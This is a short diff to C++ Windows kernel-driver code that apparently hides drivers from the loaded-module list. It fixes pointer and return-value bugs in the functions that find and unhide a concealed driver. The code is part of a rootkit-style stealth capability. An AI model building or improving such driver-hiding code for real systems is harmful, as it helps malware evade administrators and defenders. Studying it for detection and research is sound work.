@@ -861,7 +861,7 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 	NTSTATUS status = STATUS_SUCCESS;
 	HiddenDriverEntry* driverEntry = nullptr;
 
-	if (!FindHiddenDriver(driverPath, driverEntry))
+	if (!FindHiddenDriver(driverPath, &driverEntry))
 		return STATUS_NOT_FOUND;
 
 	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
@@ -871,7 +871,7 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->OriginalEntry));
 
-	if (RemoveListEntry(&hiddenDrivers, driverEntry))
+	if (!RemoveListEntry(&hiddenDrivers, driverEntry))
 		status = STATUS_UNSUCCESSFUL;
 
 	ExReleaseResourceLite(PsLoadedModuleResource);
@@ -1612,7 +1612,7 @@ HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleEntry& info)
 * @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
 */
 _IRQL_requires_max_(DISPATCH_LEVEL)
-bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry* driverEntry) const {
+bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry** driverEntry) const {
 	if (!driverPath || !IsValidPath(driverPath))
 		return false;
 
@@ -1625,7 +1625,7 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 		return false;
 
 	if (driverEntry)
-		driverEntry = item;
+		*driverEntry = item;
 	return true;
 }
 
